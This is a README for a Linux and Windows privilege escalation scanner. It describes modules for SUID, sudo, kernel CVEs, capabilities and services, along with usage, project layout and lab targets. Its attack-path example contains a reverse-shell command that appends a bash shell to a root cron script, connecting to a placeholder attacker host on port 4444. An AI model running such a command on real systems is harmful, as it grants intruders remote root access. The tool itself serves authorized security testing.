# Privilege Escalation Path Finder

A modular, analyst-grade privilege escalation scanner for Linux and Windows systems.
Identifies misconfigurations, vulnerable binaries, kernel CVEs, and chains them into
actionable **attack paths** — not just a flat list of findings.

> ⚠️ **For authorized security testing only.** Use on systems you own or have explicit permission to test.

---

## Features

| Module | Platform | What it finds |
|--------|----------|---------------|
| `suid` | Linux | SUID/SGID binaries, GTFOBins matches, CVEs |
| `sudo` | Linux | NOPASSWD rules, ALL=(ALL), wildcards, env hijack |
| `kernel` | Linux | DirtyCOW, DirtyPipe, PwnKit, OverlayFS, eBPF CVEs |
| `perms` | Linux | Writable cron, writable critical files, PATH hijack |
| `caps` | Linux | Dangerous capabilities (`cap_setuid`, `cap_sys_admin`, …) |
| `services` | Linux | Writable unit files, writable ExecStart binaries, LD_PRELOAD |
| `services` | Windows | Unquoted paths, weak DACLs, AlwaysInstallElevated |
| `tasks` | Windows | SYSTEM scheduled tasks with writable action binaries |

**Attack path builder** chains findings into multi-step exploitation graphs:
```
Initial Foothold
    ├── Writable cron script (root)  [CRITICAL]
    │        cmd: echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/cron.hourly/backup.sh
    └── 🔓 Root shell achieved
```

**Reports**: Terminal summary + color-coded HTML report + machine-readable JSON.

---

## Setup

```bash
git clone <repo>
cd privesc-finder
pip install -r requirements.txt      # just jinja2 for HTML reports
```

---

## Usage

```bash
# Full auto-detect scan
python3 main.py

# Force Linux modules
python3 main.py --linux

# Force Windows modules
python3 main.py --windows

# Run a single module
python3 main.py --module suid
python3 main.py --module sudo
python3 main.py --module kernel
python3 main.py --module perms
python3 main.py --module caps
python3 main.py --module services

# Verbose (print each finding during scan)
python3 main.py --verbose

# Custom output directory
python3 main.py --out /tmp/pentest-results

# Skip HTML report
python3 main.py --no-html
```

---

## Output

```
output/
├── report.html        # Interactive HTML report (dark theme)
└── attack_paths.json  # Machine-readable findings + paths
```

---

## Project Structure

```
privesc-finder/
├── core/
│   ├── models.py       # Finding, AttackPath, Module base class
│   ├── platform.py     # OS detection and system context
│   ├── scanner.py      # Orchestrator + attack path builder
│   └── reporter.py     # HTML + JSON report generation
├── modules/
│   ├── linux/
│   │   ├── suid.py
│   │   ├── sudo.py
│   │   ├── kernel.py
│   │   ├── permissions.py
│   │   ├── capabilities.py
│   │   └── services.py
│   └── windows/
│       └── services.py  # Services, Registry, Tasks modules
├── data/
│   ├── gtfobins.json
│   ├── kernel_cves.json
│   └── suid_known_vulns.json
├── templates/
│   └── report.html.j2
├── main.py
└── requirements.txt
```

---

## Adding a New Module

1. Create `modules/linux/mymodule.py`
2. Inherit from `Module`, implement `run() -> List[Finding]`
3. Use `self._next_id()`, `self._run_cmd()`, `self._load_json()`
4. Register in `core/scanner.py → run_linux()`

```python
from core.models import Module, Finding, Severity

class MyModule(Module):
    name = "MYMOD"
    platform = "linux"

    def run(self):
        self._findings = []
        # ... scan logic ...
        self._findings.append(Finding(
            id=self._next_id(),
            title="Found something dangerous",
            severity=Severity.HIGH,
            vector="MY_VECTOR",
            evidence="Evidence string",
            remediation="How to fix it",
            exploitability=4,
            privilege_gain=3,
        ))
        return self._findings
```

---

## Testing Against Vulnerable VMs

Recommended targets for validating your findings:
- **VulnHub**: Kioptrix series, Lin.Security, Tr0ll
- **TryHackMe**: Linux PrivEsc, Linux PrivEsc Arena
- **HackTheBox**: Legacy machines (Lame, Beep, Nibbles)

---

## Severity Rubric

| Score | Label | Example |
|-------|-------|---------|
| 9–10 | Critical | NOPASSWD sudo ALL, writable SUID root binary |
| 7–8 | High | Kernel CVE with public PoC, world-writable service unit |
| 5–6 | Medium | Weak home dir permissions, outdated kernel (no public PoC) |
| 1–4 | Low | Informational misconfigs, defense-in-depth gaps |
